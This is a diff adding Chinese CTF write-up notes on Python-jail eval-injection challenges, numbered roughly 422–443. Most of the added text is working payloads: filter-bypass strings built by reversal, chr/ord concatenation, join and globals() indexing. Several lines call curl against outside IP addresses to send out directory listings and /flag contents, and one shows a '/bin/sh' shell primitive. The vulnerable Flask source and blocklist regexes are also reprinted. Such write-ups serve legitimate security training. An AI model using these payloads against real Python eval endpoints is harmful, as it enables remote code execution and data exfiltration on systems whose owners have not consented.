@@ -1,6 +1,6 @@
 ﻿---
 title: "搭建服务器"
-lastmod: 2026-06-10T20:51:31+08:00
+lastmod: 2026-06-15T23:36:55+08:00
 draft: false
 ---
 ```bash
@@ -3856,7 +3856,19 @@ if(strlen($code) < 6){    system($code);
 感觉其实`nl *`也可以输出当前目录下的所有东西
 ## 422
 长度限制少了一位，但是就上面写的，直接`nl *`就可以了
-# 其他 pyjail
+# 其他-pyjail
+核心目标通常只有三个：
+1. 拿到执行能力：`eval` / `exec` / `__import__`
+2. 拿到文件读取能力：`open`
+3. 拿到命令执行能力：`os.system` / `subprocess`
+所以写 payload 的本质是：
+`可输入字符/语法` -> `可访问对象` -> `可构造字符串` -> `可调用危险能力`
+一般优先级：
+
+- 读 flag：`open('/flag').read()`
+- 弹 shell：`__import__('os').system('/bin/sh')`
+- 任意代码：`exec(...)`
+注意只要是字符串都可以进行python的合并，切片等
 ## 423
 没有给你源代码，看起来是一个黑盒
 提示是?code=
@@ -4107,11 +4119,370 @@ if __name__=="__main__":
     app.run(host='0.0.0.0',port=80)
 ```
 这个就是网站的源代码，发现这里把match从头匹配换成了search全局匹配，所以之前这种方式过不了
+可以把ls替换成`base64 -w 0 app.py`，这个样子就能获得源代码
 ## 433
 
 先尝试一下上一道题目的payload
 发现builtins被禁用了
 直接用import，但是用str包裹一下
-`?code=str(__import__('o'%2b's').__getattribute__('sys'%2b'tem')('curl 43.129.80.243/1.php?a=`ls`'))`
+```
+?code=str(__import__('o'%2b's').__getattribute__('sys'%2b'tem')('curl 43.129.80.243/1.php?a=`ls`'))
+```
 str的作用是把结果转换成字符串
-其实用不用str都能外带出来结果，区别就是
+其实用不用str都能外带出结果，区别就是主界面能不能显示出来
+## 434
+```
+?code=str(__import__('o'%2b's').__getattribute__('sys'%2b'tem')('cu'%2b'rl https://60.215.128.110:44202/1.php?a=`ls`'))
+```
+尝试了一下，数据没有外带出来
+经过测试，是把curl禁用了
+把curl中间加一个加号就行了
+注意一下一定要加-k，不然会报错
+## 435
+尝试一下上面一道题目的payload，看起来是没有注入进去
+发现是把下划线给禁掉了，那么就用
+```
+?code=str(')"`sl`=p?20244:011.821.512.06//:sptth k- lruc"(metsys.so ;so tropmi'[::-1])
+```
+这个可以展示代码，最终用
+```
+?code=str(exec(')"`sl`=p?php.1/20244:011.821.512.06//:sptth k- lruc"(metsys.so ;so tropmi'[::-1]))
+```
+注意一下可以用下面语句来查看第二行的ls是什么
+```
+ls | sed -n \'2p\'
+```
+## 436
+还是能直接用上面一道题目的payload
+过滤了getattr，不然我们拼接，但是其实可以根本就不用这个
+```
+?code=str(exec(')"`galf/ tac`=p?php.1/20244:011.821.512.06//:sptth k- lruc"(metsys.so ;so tropmi'[::-1]))
+```
+## 437
+```
+if '\\u' in code: return 'hacker?'
+```
+代表unicode编码，py中可以识别这个
+- 在字符串里，`\u` 后面跟着 4 位十六进制数字，用来表示一个 Unicode 字符的编码
+- 比如 `\u4f60` 表示汉字 “你”，`\u597d` 表示汉字 “好”
+- 这种写法在很多编程语言和数据格式（如 JSON）中都用来表达非 ASCII 字符
+## 438
+```
+?code=str(exec(')"`galf/ tac`=p?php.1/20244:011.821.512.06//:sptth k- lruc"(metsys.so ;so tropmi'[::-1]))
+```
+使用上一道题目的方法可以直接获取到flag
+```
+?code=str(exec(')"`yp.ppa 0 w- 46esab`=p?php.1/20244:011.821.512.06//:sptth k- lruc"(metsys.so ;so tropmi'[::-1]))
+```
+这个可以直接看到源代码
+```python
+from flask import Flask
+from flask import request
+import re
+
+
+app = Flask(__name__)
+
+def Q2B(uchar):
+    inside_code = ord(uchar)
+    if inside_code == 0x3000:
+        inside_code = 0x0020
+    else:
+        inside_code -= 0xfee0
+    if inside_code < 0x0020 or inside_code > 0x7e: 
+        return uchar
+    return chr(inside_code)
+
+def stringQ2B(ustring):
+    return "".join([Q2B(uchar) for uchar in ustring])
+
+@app.route('/')
+def app_index():
+    code = request.args.get('code')
+    if code:
+    	code = stringQ2B(code)
+    	if '\\u' in code:
+    		return 'hacker?'
+    	reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{')
+    	if reg.search(code)==None:
+    		return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+
+```
+这个里面过滤了{，但是我们根本就用不到这个符号，所以其实相当于什么也没有过滤
+## 439
+```
+?code=str(exec(')"`galf/ tac`=p?php.1/20244:011.821.512.06//:sptth k- lruc"(metsys.so ;so tropmi'[::-1]))
+```
+上面一道题目的payload依旧是能用的
+```python
+from flask import Flask
+from flask import request
+import re
+
+
+app = Flask(__name__)
+
+def Q2B(uchar):
+    inside_code = ord(uchar)
+    if inside_code == 0x3000:
+        inside_code = 0x0020
+    else:
+        inside_code -= 0xfee0
+    if inside_code < 0x0020 or inside_code > 0x7e: 
+        return uchar
+    return chr(inside_code)
+
+def stringQ2B(ustring):
+    return "".join([Q2B(uchar) for uchar in ustring])
+
+@app.route('/')
+def app_index():
+    code = request.args.get('code')
+    if code:
+    	code = stringQ2B(code)
+    	if '\\u' in code:
+    		return 'hacker?'
+    	if '\\x' in code:
+    		return 'hacker?'
+    	reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{')
+    	if reg.search(code)==None:
+    		return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+```
+ban掉了`\\x`
+`\x` 是一种**转义序列**，用来表示十六进制形式的字符
+## 440
+这道题目把'禁用了
+所以需要通过一个个ord和+拼接起来
+ord是转换成ascii编码，chr是转换回来
+可以用一个程序更换
+```python
+s = "import os;os.system('curl http://你的vps地址:端口?p=`ls`')"
+res = ''
+for i in s:
+    res += f"chr({ord(i)})%2B"
+print('str(exec('+res[:-3]+'))')
+```
+`base64 -w 0 app.py`是输出app.py的命令
+```python
+from flask import Flask
+from flask import request
+import re
+
+
+app = Flask(__name__)
+
+def Q2B(uchar):
+    inside_code = ord(uchar)
+    if inside_code == 0x3000:
+        inside_code = 0x0020
+    else:
+        inside_code -= 0xfee0
+    if inside_code < 0x0020 or inside_code > 0x7e: 
+        return uchar
+    return chr(inside_code)
+
+def stringQ2B(ustring):
+    return "".join([Q2B(uchar) for uchar in ustring])
+
+@app.route('/')
+def app_index():
+    code = request.args.get('code')
+    if code:
+    	code = stringQ2B(code)
+    	if '\\u' in code:
+    		return 'hacker?'
+    	if '\\x' in code:
+    		return 'hacker?'
+    	reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\'|"')
+    	if reg.search(code)==None:
+    		return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+```
+再次检查原代码，发现是禁用掉了引号
+## 441
+这一道题目是禁用掉了加号，说明之前的ord拼接的方式不可行
+那么就换一种方法，使用join拼接
+join是str的方法，可以使用`join['1','2','3']`这种方法拼接
+```python
+for i in s:
+
+    res += f"chr({ord(i)}),"
+
+print('exec(str().join(['+res[:-1]+']))')
+```
+直接exec执行就可以了，外部的str不是不需要加，如果加上就能让前端的界面打开
+查看源代码
+```python
+from flask import Flask
+from flask import request
+import re
+
+
+app = Flask(__name__)
+
+def Q2B(uchar):
+    inside_code = ord(uchar)
+    if inside_code == 0x3000:
+        inside_code = 0x0020
+    else:
+        inside_code -= 0xfee0
+    if inside_code < 0x0020 or inside_code > 0x7e: 
+        return uchar
+    return chr(inside_code)
+
+def stringQ2B(ustring):
+    return "".join([Q2B(uchar) for uchar in ustring])
+
+@app.route('/')
+def app_index():
+    code = request.args.get('code')
+    if code:
+    	code = stringQ2B(code)
+    	if '\\u' in code:
+    		return 'hacker?'
+    	if '\\x' in code:
+    		return 'hacker?'
+    	reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\'|"|\+')
+    	if reg.search(code)==None:
+    		return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+```
+## 442
+过滤了数字
+```
+?code=str(exec(request.args.get(request.method)))&GET=import os;os.system('curl -k https://60.215.128.110:44202/1.php?p=`cat /flag`')
+```
+有点恶心，但是可以直接通过request.args.get(request.method)绕过
+因为这个程序里面不能出现任何的'和"，所以只能找一个字符串
+request.method因为是get传参，所以返回值是GET
+直接通过这个get就能获取
+查看源代码
+```python
+from flask import Flask
+from flask import request
+import re
+
+
+app = Flask(__name__)
+
+def Q2B(uchar):
+    inside_code = ord(uchar)
+    if inside_code == 0x3000:
+        inside_code = 0x0020
+    else:
+        inside_code -= 0xfee0
+    if inside_code < 0x0020 or inside_code > 0x7e: 
+        return uchar
+    return chr(inside_code)
+
+def stringQ2B(ustring):
+    return "".join([Q2B(uchar) for uchar in ustring])
+
+@app.route('/')
+def app_index():
+    code = request.args.get('code')
+    if code:
+    	code = stringQ2B(code)
+    	if '\\u' in code:
+    		return 'hacker?'
+    	if '\\x' in code:
+    		return 'hacker?'
+    	reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\'|"|\+|[0-9]')
+    	if reg.search(code)==None:
+    		return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+```
+这个数字过滤有点太恶心了
+## 443
+现在两眼一抹黑
+先打印出来已经有的东西出来看一下
+```
+code=str(globals())
+```
+输出下面的字符串
+```
+{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f137d898b80>, '__spec__': None, '__annotations__': {}, '__builtins__': , '__file__': '/app/app.py', '__cached__': None, 'Flask': , 'request': , 're': , 'app': , 'Q2B': , 'stringQ2B': , 'app_index': }
+```
+这一道题目直接禁用了request这个输出
+没有办法搞到输出怎么办，通过这个globals直接一个个拿
+这个request是第10个，所以需要`list(globals().keys())[10]`来获取这个request
+至于10不能拿到的问题，用True拼接
+```
+True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)
+
+list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]
+```
+这个的结果是request这个字符串，需要`globals()[]`来获取这个对象
+```
+globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]]
+```
+这个等价于request
+所以把上面一道题目的payload先转换成post
+```
+code=str(exec(request.args.get(request.method)))&POST=import os;os.system('curl -k https://60.215.128.110:44202/1.php?p=`cat /flag`')
+```
+再转换一遍
+```
+POST传入：
+code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))
+GET传入：
+POST=import os;os.system('curl -k https://60.215.128.110:44202/1.php?p=`cat /flag`')
+```
+注意一下不能写错true个数
+源代码
+```python
+from flask import Flask
+from flask import request
+import re
+
+
+app = Flask(__name__)
+
+def Q2B(uchar):
+    inside_code = ord(uchar)
+    if inside_code == 0x3000:
+        inside_code = 0x0020
+    else:
+        inside_code -= 0xfee0
+    if inside_code < 0x0020 or inside_code > 0x7e: 
+        return uchar
+    return chr(inside_code)
+
+def stringQ2B(ustring):
+    return "".join([Q2B(uchar) for uchar in ustring])
+
+@app.route('/',methods=['POST', 'GET'])
+def app_index():
+    if request.method == 'POST':
+        code = request.form['code']
+        if code:
+        	code = stringQ2B(code)
+        	if '\\u' in code:
+        		return 'hacker?'
+        	if '\\x' in code:
+        		return 'hacker?'
+        	reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\'|"|\+|[0-9]|request')
+        	if reg.search(code)==None:
+        		return eval(code)
+    return 'where is flag?<!-- /?code -->'
+
+if __name__=="__main__":
+    app.run(host='0.0.0.0',port=80)
+```
